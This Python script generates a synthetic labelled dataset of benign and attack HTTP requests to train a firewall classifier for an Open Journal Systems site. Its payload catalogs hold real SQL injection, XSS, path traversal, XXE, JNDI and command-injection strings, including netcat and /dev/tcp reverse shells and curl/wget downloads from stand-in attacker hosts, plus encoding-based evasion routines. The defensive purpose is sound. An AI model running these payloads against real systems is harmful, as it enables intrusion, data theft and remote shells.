"""
Realistic OJS WAF dataset generator.

Replaces the previous nine-template synthetic generator. Produces records
schema-compatible with `dataset/meta/schema_v3.json` so the same files can be
fed to the runtime sidecar's writer or re-loaded later for offline analysis.

Design intent
-------------
1. Ground-truth labels come from the synthesis routine itself, not from a
   downstream rule classifier. The Random Forest is therefore free to
   discover signal the regex catalog in `core/sidecar_agent.py` misses.

2. Each attack family has many surface forms (URL-encoded, double-encoded,
   case-mixed, comment-split, IFS-bypass, alternate route placement) so the
   model cannot learn the dataset by memorizing literals.

3. Benign records mirror real OJS browse / search / download / login /
   editorial-API workflows with realistic User-Agents, Referers, and search
   terms. They MUST NOT collide with attacker scanner signatures.

4. Source IPs are clustered into a small "campaign" pool so the stateful
   `req_rate` feature in `ml_training/features.py` has meaningful variance.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Iterable
from urllib.parse import quote

import pandas as pd


# ---------------------------------------------------------------------------
# Schema (kept aligned with dataset/meta/schema_v3.json)
# ---------------------------------------------------------------------------

RAW_FIELDS = [
    "request_id",
    "timestamp",
    "method",
    "uri",
    "query_string",
    "query_params_json",
    "host",
    "user_agent",
    "content_type",
    "accept",
    "referer",
    "cookie_hash",
    "authorization_type",
    "x_forwarded_for",
    "body_truncated",
    "body_len_original",
    "source_ip",
    "source_port",
    "server_ip",
    "server_port",
    "proto",
    "pcap_file",
    "tcp_flags",
    "tcp_flags_str",
    "response_status",
    "response_headers_json",
    "response_size",
    "response_time_ms",
    "response_body_truncated",
    "response_body_len_original",
    "headers_raw",
]
LABELED_EXTRA_FIELDS = [
    "decision",
    "threat_score",
    "confidence",
    "attack_type",
    "model_version",
]

ATTACK_TYPES = (
    "SQL_INJECTION",
    "XSS",
    "PATH_TRAVERSAL",
    "COMMAND_INJECTION",
    "UNKNOWN_ATTACK",
)

GENERATOR_VERSION = "realistic-v1"


# ---------------------------------------------------------------------------
# Realistic OJS vocabulary
# ---------------------------------------------------------------------------

JOURNALS = (
    "jurnalsainshealth",
    "ojsinternasional",
    "testjournal",
    "medjournal",
    "edujournal",
    "scifrontier",
)

REAL_BROWSER_UAS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 "
    "Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) "
    "Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
)

SCANNER_UAS = (
    "sqlmap/1.7.10#dev (http://sqlmap.org)",
    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)",
    "Mozilla/5.0 zgrab/0.x",
    "python-requests/2.31.0",
    "curl/7.81.0",
    "Wget/1.21.3",
    "Go-http-client/1.1",
    "WPScan v3.8.24 (https://wpscan.com)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "gobuster/3.5",
    "ffuf/2.0.0",
)

SEARCH_TERMS_BENIGN = (
    "machine learning", "nephrology", "kidney disease", "public health",
    "medical informatics", "pediatric oncology", "cardiology",
    "biostatistics", "vaccine efficacy", "covid-19", "diabetes",
    "renewable energy", "ai ethics", "education policy",
    "qualitative research", "randomized trial", "systematic review",
    "open access", "scholarly communication", "epidemiology",
)

SEARCH_FIELDS_BENIGN = ("query", "author", "title", "abstract", "fullText")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_rng(seed: int | None) -> random.Random:
    return random.Random(seed) if seed is not None else random.Random()


def _ip_pool(rng: random.Random, n: int) -> list[str]:
    return [
        f"{rng.randint(11, 223)}.{rng.randint(0, 255)}.{rng.randint(0, 255)}."
        f"{rng.randint(1, 254)}"
        for _ in range(n)
    ]


def _timestamp(rng: random.Random, base_day: datetime) -> str:
    delta = timedelta(seconds=rng.randint(0, 86_399))
    return (base_day + delta).isoformat()


def _hash_cookie(value: str) -> str:
    if not value:
        return ""
    return hashlib.sha256(value.encode("utf-8")).hexdigest()[:16]


def _build_record(
    *,
    rng: random.Random,
    base_day: datetime,
    method: str,
    uri: str,
    query_string: str,
    body: str,
    host: str,
    user_agent: str,
    referer: str,
    accept: str,
    content_type: str,
    source_ip: str,
    decision: str,
    attack_type: str,
    threat_score: float,
    confidence: float,
    response_status: int,
) -> dict:
    timestamp = _timestamp(rng, base_day)
    request_id = hashlib.md5(
        f"{timestamp}|{source_ip}|{uri}|{rng.random()}".encode("utf-8")
    ).hexdigest()[:16]

    cookie_raw = f"OJSSID={rng.randint(10**15, 10**16-1)}" if rng.random() < 0.5 else ""
    auth_raw = "Bearer" if rng.random() < 0.05 else ""

    headers_dict = {
        "Host": host,
        "User-Agent": user_agent,
        "Accept": accept,
        "Referer": referer,
    }
    if content_type:
        headers_dict["Content-Type"] = content_type

    return {
        "request_id": request_id,
        "timestamp": timestamp,
        "method": method,
        "uri": uri,
        "query_string": query_string,
        "query_params_json": "{}",
        "host": host,
        "user_agent": user_agent,
        "content_type": content_type,
        "accept": accept,
        "referer": referer,
        "cookie_hash": _hash_cookie(cookie_raw),
        "authorization_type": auth_raw,
        "x_forwarded_for": "",
        "body_truncated": body,
        "body_len_original": len(body),
        "source_ip": source_ip,
        "source_port": rng.randint(40000, 65535),
        "server_ip": "10.0.0.10",
        "server_port": 80,
        "proto": "TCP",
        "pcap_file": "",
        "tcp_flags": "",
        "tcp_flags_str": "",
        "response_status": response_status,
        "response_headers_json": "{}",
        "response_size": rng.randint(500, 50000) if response_status == 200 else 0,
        "response_time_ms": rng.randint(5, 800),
        "response_body_truncated": "",
        "response_body_len_original": 0,
        "headers_raw": json.dumps(headers_dict),
        "decision": decision,
        "threat_score": round(threat_score, 4),
        "confidence": round(confidence, 4),
        "attack_type": attack_type,
        "model_version": GENERATOR_VERSION,
    }


# ---------------------------------------------------------------------------
# Benign generation
# ---------------------------------------------------------------------------

def _gen_benign(rng: random.Random, base_day: datetime, source_ip: str) -> dict:
    journal = rng.choice(JOURNALS)
    user_agent = rng.choice(REAL_BROWSER_UAS)
    accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    content_type = ""
    body = ""
    method = "GET"

    pattern = rng.choices(
        (
            "static_css", "static_js", "static_img",
            "index", "article_view", "article_view_galley",
            "article_download", "issue_current", "issue_archive",
            "issue_view", "search_query", "search_fielded",
            "user_login_get", "user_login_post", "user_register",
            "user_profile", "about", "editorial_team",
            "api_contexts", "api_submissions",
            # Admin / editor / reviewer workflows
            "dashboard", "manager_setup", "manager_users",
            "editor_submissions", "submission_wizard",
            "submission_save", "ajax_call", "reviewer_queue",
        ),
        weights=(
            12, 10, 8,
            12, 18, 6,
            6, 4, 4,
            6, 14, 6,
            4, 3, 2,
            2, 4, 2,
            3, 4,
            3, 3, 2,
            4, 5,
            4, 7, 3,
        ),
        k=1,
    )[0]

    journal_root = f"/index.php/{journal}"
    referer = f"https://ojs.local{journal_root}"
    qs = ""

    if pattern == "static_css":
        uri = rng.choice((
            "/lib/pkp/styles/pkp.css",
            "/lib/pkp/styles/articleView.css",
            "/plugins/themes/default/styles/index.css",
        ))
        accept = "text/css,*/*;q=0.1"
    elif pattern == "static_js":
        uri = rng.choice((
            "/lib/pkp/js/main.js",
            "/lib/pkp/js/lib/jquery/jquery.min.js",
            "/plugins/themes/default/js/main.js",
        ))
        accept = "*/*"
    elif pattern == "static_img":
        uri = f"/public/journals/{rng.randint(1, 6)}/cover_issue_{rng.randint(1, 30)}.png"
        accept = "image/avif,image/webp,*/*"
    elif pattern == "index":
        uri = journal_root if rng.random() < 0.5 else f"{journal_root}/index"
    elif pattern == "article_view":
        uri = f"{journal_root}/article/view/{rng.randint(1, 5000)}"
    elif pattern == "article_view_galley":
        uri = f"{journal_root}/article/view/{rng.randint(1, 5000)}/{rng.randint(1, 20)}"
    elif pattern == "article_download":
        uri = (
            f"{journal_root}/article/download/{rng.randint(1, 5000)}/"
            f"{rng.randint(1, 20)}"
        )
    elif pattern == "issue_current":
        uri = f"{journal_root}/issue/current"
    elif pattern == "issue_archive":
        uri = f"{journal_root}/issue/archive"
    elif pattern == "issue_view":
        uri = f"{journal_root}/issue/view/{rng.randint(1, 200)}"
    elif pattern == "search_query":
        term = rng.choice(SEARCH_TERMS_BENIGN)
        qs = f"query={quote(term)}"
        uri = f"{journal_root}/search/search?{qs}"
    elif pattern == "search_fielded":
        field = rng.choice(SEARCH_FIELDS_BENIGN)
        term = rng.choice(SEARCH_TERMS_BENIGN)
        qs = f"{field}={quote(term)}&dateFromYear={rng.randint(2015, 2025)}"
        uri = f"{journal_root}/search/search?{qs}"
    elif pattern == "user_login_get":
        uri = f"{journal_root}/login"
    elif pattern == "user_login_post":
        uri = f"{journal_root}/login/signIn"
        method = "POST"
        content_type = "application/x-www-form-urlencoded"
        body = (
            f"username=user{rng.randint(1, 9999)}&password=[REDACTED]"
            f"&source=&loginMessage="
        )
    elif pattern == "user_register":
        uri = f"{journal_root}/user/register"
    elif pattern == "user_profile":
        uri = f"{journal_root}/user/profile"
    elif pattern == "about":
        uri = f"{journal_root}/about"
    elif pattern == "editorial_team":
        uri = f"{journal_root}/about/editorialTeam"
    elif pattern == "api_contexts":
        uri = f"{journal_root}/api/v1/contexts"
        accept = "application/json"
    elif pattern == "api_submissions":
        status = rng.choice(("queued", "published", "accepted", "review"))
        qs = f"status={status}&count={rng.randint(10, 50)}"
        uri = f"{journal_root}/api/v1/submissions?{qs}"
        accept = "application/json"
    elif pattern == "dashboard":
        uri = f"{journal_root}/dashboard"
    elif pattern == "manager_setup":
        page = rng.choice(("index", "contact", "masthead", "about", "appearance"))
        uri = f"{journal_root}/manager/setup/{page}"
    elif pattern == "manager_users":
        if rng.random() < 0.5:
            role = rng.choice(("all", "author", "reviewer", "editor", "manager"))
            qs = f"roleId={role}"
            uri = f"{journal_root}/manager/users?{qs}"
        else:
            uri = f"{journal_root}/manager/users"
    elif pattern == "editor_submissions":
        section = rng.choice(("unassigned", "inReview", "inEditing", "published", ""))
        page_num = rng.randint(1, 10)
        qs = f"page={page_num}"
        base = f"{journal_root}/editor/submissions"
        uri = f"{base}/{section}?{qs}" if section else f"{base}?{qs}"
    elif pattern == "submission_wizard":
        step = rng.randint(1, 5)
        submission_id = rng.randint(1, 500)
        if rng.random() < 0.7:
            qs = f"step={step}&submissionId={submission_id}"
        else:
            qs = f"step={step}"
        uri = f"{journal_root}/submission/wizard/{step}?{qs}"
    elif pattern == "submission_save":
        step = rng.randint(1, 5)
        submission_id = rng.randint(1, 500)
        uri = f"{journal_root}/submission/wizard/{step}"
        method = "POST"
        content_type = "application/x-www-form-urlencoded"
        locale = rng.choice(("en", "id", "fr", "de"))
        title_val = quote(rng.choice((
            "A Study on Machine Learning Applications in Healthcare",
            "Public Health Outcomes in Urban Settings",
            "Advances in Biomedical Engineering Research",
            "Environmental Impact Assessment Methods",
            "Systematic Review of Randomized Clinical Trials",
            "Deep Learning for Medical Image Analysis",
            "Epidemiology of Infectious Diseases in Southeast Asia",
        )))
        body = (
            f"step={step}&submissionId={submission_id}"
            f"&locale={locale}&title%5B{locale}%5D={title_val}"
            f"&abstract%5B{locale}%5D=This+paper+investigates+the+subject+in+detail."
            f"&keywords%5B{locale}%5D=research%2C+analysis%2C+methodology"
        )
    elif pattern == "ajax_call":
        grid = rng.choice((
            "ui/file-api/get-files",
            "grid/files/submission/submissionFiles/fetchGrid",
            "grid/submissions/unassigned/unassignedSubmissionsListHandler/fetchGrid",
            "grid/submissions/review/reviewSubmissionsListHandler/fetchGrid",
            "ui/reviewer/reviewer-list",
            "grid/editor/queries/query/fetchGrid",
            "grid/files/reviewFiles/reviewFileSelection/fetchGrid",
        ))
        submission_id = rng.randint(1, 500)
        stage_id = rng.randint(1, 5)
        if rng.random() < 0.7:
            qs = f"submissionId={submission_id}&stageId={stage_id}"
        else:
            qs = f"stageId={stage_id}"
        uri = f"{journal_root}/$$$call$$$/{grid}?{qs}"
        accept = "application/json, text/javascript, */*"
    elif pattern == "reviewer_queue":
        submission_id = rng.randint(1, 500)
        if rng.random() < 0.7:
            qs = f"submissionId={submission_id}"
            uri = f"{journal_root}/reviewer/submission?{qs}"
        else:
            uri = f"{journal_root}/reviewer/submission"
    else:
        uri = journal_root

    return _build_record(
        rng=rng, base_day=base_day, method=method, uri=uri,
        query_string=qs, body=body, host="ojs.local",
        user_agent=user_agent, referer=referer, accept=accept,
        content_type=content_type, source_ip=source_ip, decision="PASS",
        attack_type="NONE",
        threat_score=rng.uniform(0.0, 0.18),
        confidence=rng.uniform(0.82, 0.99),
        response_status=200,
    )


# ---------------------------------------------------------------------------
# Attack payload catalogs (each entry is a raw, undecoded payload)
# ---------------------------------------------------------------------------

SQLI_PAYLOADS = (
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "admin'-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
    "' UNION SELECT username,password,NULL FROM users-- ",
    "1' AND SLEEP(5)-- ",
    "1; WAITFOR DELAY '0:0:5'-- ",
    "' OR 1=1 LIMIT 1 -- ",
    "1' OR 1=1 #",
    "'; DROP TABLE users-- ",
    "1' AND (SELECT COUNT(*) FROM users)>0 -- ",
    "1 UNION SELECT @@version,user(),database()-- ",
    "1' AND extractvalue(1,concat(0x7e,user(),0x7e))-- ",
    "1 OR BENCHMARK(1000000,MD5('x'))",
    "1' OR 'a'='a",
    "1) OR (1=1",
    "1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- ",
    "' AND (SELECT 1 FROM information_schema.tables LIMIT 1)-- ",
    "0' UNION SELECT NULL,table_name FROM information_schema.tables-- ",
    "' OR 1=1; pg_sleep(5)-- ",
)

XSS_PAYLOADS = (
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "\"><script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<object data=\"data:text/html,<script>alert(1)</script>\">",
    "<script>eval(String.fromCharCode(97,108,101,114,116))(1)</script>",
    "javascript:alert(1)",
    "<svg><script>alert(1)</script></svg>",
    "\" autofocus onfocus=alert(1) x=\"",
    "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
    "<img srcdoc=\"<script>alert(1)</script>\">",
)

PATH_TRAVERSAL_PAYLOADS = (
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "/proc/self/environ",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\boot.ini",
    "../../../../../../var/log/auth.log",
)

CMD_INJ_PAYLOADS = (
    "; cat /etc/passwd",
    "; ls -la",
    "| nc -e /bin/bash 10.0.0.1 4444",
    "`whoami`",
    "$(id)",
    "$(cat /etc/passwd)",
    "&& curl http://attacker/x.sh | bash",
    "|| ls /",
    "; sleep 5",
    "cat${IFS}/etc/passwd",
    "$IFS$9cat$IFS$9/etc/passwd",
    "%7c%20whoami",
    "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "; python -c 'import os; os.system(\"id\")'",
    "&& wget http://attacker.com/x -O /tmp/x",
)

UNKNOWN_PAYLOADS = (
    "A" * 1024,  # oversized parameter / buffer-overflow probe
    "%uff1c%uff53%uff43%uff52%uff49%uff50%uff54%uff1e",  # unicode XSS
    "../../../../../../../dev/null",
    "${jndi:ldap://attacker.com/a}",  # log4shell-style
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "
    "\"file:///etc/passwd\">]><foo>&xxe;</foo>",  # XXE
    "{\"$ne\": null}",  # NoSQL injection
    "%00%00%00%00%00%00%00%00",  # null-byte flood
)


def _evade_case(text: str, rng: random.Random) -> str:
    return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in text)


def _evade_comment_split(text: str, rng: random.Random) -> str:
    """Split common SQL keywords with /**/ MySQL inline comments."""
    import re as _re
    keywords = ("UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "INSERT", "DELETE")
    pattern = _re.compile("(" + "|".join(keywords) + ")", _re.IGNORECASE)

    def split_kw(match: "_re.Match[str]") -> str:
        return "/**/".join(match.group(0))

    return pattern.sub(split_kw, text)


def _apply_evasion(payload: str, rng: random.Random) -> str:
    technique = rng.choices(
        ("none", "url_encode", "case_mix", "comment_split", "double_encode"),
        weights=(3, 4, 3, 2, 1),
        k=1,
    )[0]
    if technique == "url_encode":
        return quote(payload, safe="")
    if technique == "case_mix":
        return _evade_case(payload, rng)
    if technique == "comment_split":
        return _evade_comment_split(payload, rng)
    if technique == "double_encode":
        return quote(quote(payload, safe=""), safe="")
    return payload


# ---------------------------------------------------------------------------
# Attack record generation
# ---------------------------------------------------------------------------

def _gen_attack(
    rng: random.Random, base_day: datetime, source_ip: str, attack_type: str
) -> dict:
    journal = rng.choice(JOURNALS)
    user_agent = (
        rng.choice(SCANNER_UAS) if rng.random() < 0.55 else rng.choice(REAL_BROWSER_UAS)
    )
    accept = rng.choice(("*/*", "text/html,*/*;q=0.8", "application/json"))
    referer = "" if rng.random() < 0.6 else f"https://ojs.local/index.php/{journal}"
    method = "GET"
    body = ""
    content_type = ""

    journal_root = f"/index.php/{journal}"
    qs = ""
    uri = journal_root

    if attack_type == "SQL_INJECTION":
        base_payload = rng.choice(SQLI_PAYLOADS)
        payload = _apply_evasion(base_payload, rng)
        target = rng.choices(
            ("search", "article_id", "login_post", "api_id"),
            weights=(4, 3, 2, 2), k=1,
        )[0]
        if target == "search":
            qs = f"query={payload}"
            uri = f"{journal_root}/search/search?{qs}"
        elif target == "article_id":
            uri = f"{journal_root}/article/view/{payload}"
        elif target == "login_post":
            uri = f"{journal_root}/login/signIn"
            method = "POST"
            content_type = "application/x-www-form-urlencoded"
            body = f"username={payload}&password=anything"
        else:
            qs = f"id={payload}"
            uri = f"{journal_root}/api/v1/submissions?{qs}"

    elif attack_type == "XSS":
        base_payload = rng.choice(XSS_PAYLOADS)
        payload = _apply_evasion(base_payload, rng)
        target = rng.choices(
            ("search", "register_user", "comment_body"),
            weights=(5, 3, 2), k=1,
        )[0]
        if target == "search":
            qs = f"query={payload}"
            uri = f"{journal_root}/search/search?{qs}"
        elif target == "register_user":
            qs = f"username={payload}"
            uri = f"{journal_root}/user/register?{qs}"
        else:
            uri = f"{journal_root}/comments/save"
            method = "POST"
            content_type = "application/x-www-form-urlencoded"
            body = f"comment={payload}&article=42"

    elif attack_type == "PATH_TRAVERSAL":
        payload = rng.choice(PATH_TRAVERSAL_PAYLOADS)
        if rng.random() < 0.2:
            payload = _apply_evasion(payload, rng)
        target = rng.choices(
            ("article_download", "search_query", "raw_path"),
            weights=(5, 3, 2), k=1,
        )[0]
        if target == "article_download":
            uri = (
                f"{journal_root}/article/download/{rng.randint(1, 5000)}/{payload}"
            )
        elif target == "search_query":
            qs = f"query={payload}"
            uri = f"{journal_root}/search/search?{qs}"
        else:
            uri = f"{journal_root}/{payload}"

    elif attack_type == "COMMAND_INJECTION":
        base_payload = rng.choice(CMD_INJ_PAYLOADS)
        payload = (
            _apply_evasion(base_payload, rng) if rng.random() < 0.4 else base_payload
        )
        target = rng.choices(
            ("search", "upload_filename", "api_id"),
            weights=(5, 3, 2), k=1,
        )[0]
        if target == "search":
            qs = f"query=health{payload}"
            uri = f"{journal_root}/search/search?{qs}"
        elif target == "upload_filename":
            uri = f"{journal_root}/files/upload"
            method = "POST"
            content_type = "multipart/form-data; boundary=----X"
            body = (
                f"------X\r\nfilename=\"x{payload}.pdf\"\r\n\r\n%PDF-1.4\r\n------X--"
            )
        else:
            qs = f"id=1{payload}"
            uri = f"{journal_root}/api/v1/submissions?{qs}"

    else:  # UNKNOWN_ATTACK
        payload = rng.choice(UNKNOWN_PAYLOADS)
        if rng.random() < 0.5:
            qs = f"q={payload}"
            uri = f"{journal_root}/search/search?{qs}"
        else:
            uri = f"{journal_root}/{payload}"
        if rng.random() < 0.4:
            method = rng.choice(("TRACE", "PUT", "PROPFIND"))

    return _build_record(
        rng=rng, base_day=base_day, method=method, uri=uri,
        query_string=qs, body=body, host="ojs.local",
        user_agent=user_agent, referer=referer, accept=accept,
        content_type=content_type, source_ip=source_ip,
        decision="BLOCK", attack_type=attack_type,
        threat_score=rng.uniform(0.80, 0.99),
        confidence=rng.uniform(0.85, 0.99),
        response_status=0,
    )


# ---------------------------------------------------------------------------
# Public entry points
# ---------------------------------------------------------------------------

def generate_dataset(
    n_benign: int = 4500,
    n_attack_per_type: int = 600,
    seed: int | None = 42,
    base_day: datetime | None = None,
) -> pd.DataFrame:
    """
    Synthesize an OJS WAF dataset.

    Total records = n_benign + n_attack_per_type * len(ATTACK_TYPES).
    Default 4500 + 5*600 = 7500 records, ~60/40 benign/attack split.

    The returned DataFrame contains both raw and labeled columns (schema_v3
    superset). Caller may split by `decision`/`attack_type` for stratified
    train/test, or write the same frame to disk via `write_schema_v3_csvs`.
    """
    rng = _make_rng(seed)
    if base_day is None:
        base_day = datetime.now(timezone.utc).replace(
            hour=0, minute=0, second=0, microsecond=0
        )

    benign_ips = _ip_pool(rng, 800)
    attack_ips = _ip_pool(rng, 25)

    records: list[dict] = []
    for _ in range(n_benign):
        records.append(_gen_benign(rng, base_day, rng.choice(benign_ips)))

    for attack_type in ATTACK_TYPES:
        for _ in range(n_attack_per_type):
            records.append(
                _gen_attack(rng, base_day, rng.choice(attack_ips), attack_type)
            )

    rng.shuffle(records)
    return pd.DataFrame.from_records(records)


def write_schema_v3_csvs(
    df: pd.DataFrame,
    output_dir: Path | str,
    date_str: str | None = None,
) -> tuple[Path, Path]:
    """
    Persist the dataset as two CSVs matching `dataset/meta/schema_v3.json`:
      <output_dir>/raw/<date>.csv
      <output_dir>/labeled/<date>.csv

    Returns the two paths written.
    """
    output_dir = Path(output_dir)
    if date_str is None:
        date_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")

    raw_dir = output_dir / "raw"
    labeled_dir = output_dir / "labeled"
    raw_dir.mkdir(parents=True, exist_ok=True)
    labeled_dir.mkdir(parents=True, exist_ok=True)

    raw_path = raw_dir / f"{date_str}.csv"
    labeled_path = labeled_dir / f"{date_str}.csv"

    raw_df = df[RAW_FIELDS]
    labeled_df = df[RAW_FIELDS + LABELED_EXTRA_FIELDS]

    raw_df.to_csv(raw_path, index=False, quoting=csv.QUOTE_MINIMAL)
    labeled_df.to_csv(labeled_path, index=False, quoting=csv.QUOTE_MINIMAL)
    return raw_path, labeled_path


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _parse_args(argv: Iterable[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Realistic OJS WAF dataset generator")
    p.add_argument("--n-benign", type=int, default=4500)
    p.add_argument("--n-attack-per-type", type=int, default=600)
    p.add_argument("--seed", type=int, default=42)
    p.add_argument(
        "--output-dir",
        default=str(Path(__file__).resolve().parent.parent / "dataset" / "synthetic"),
        help="Directory containing raw/ and labeled/ subfolders to write into.",
    )
    p.add_argument(
        "--date",
        default=None,
        help="ISO date (YYYY-MM-DD) used as the CSV filename and the timestamp base.",
    )
    return p.parse_args(list(argv) if argv else None)


def main(argv: Iterable[str] | None = None) -> None:
    args = _parse_args(argv)
    base_day = (
        datetime.fromisoformat(args.date).replace(tzinfo=timezone.utc)
        if args.date
        else None
    )
    df = generate_dataset(
        n_benign=args.n_benign,
        n_attack_per_type=args.n_attack_per_type,
        seed=args.seed,
        base_day=base_day,
    )
    raw_path, labeled_path = write_schema_v3_csvs(df, args.output_dir, args.date)
    counts = df["attack_type"].value_counts().to_dict()
    print(f"[*] Generated {len(df)} records")
    print(f"    Class distribution: {counts}")
    print(f"    Raw CSV     -> {raw_path}")
    print(f"    Labeled CSV -> {labeled_path}")


if __name__ == "__main__":
    main()
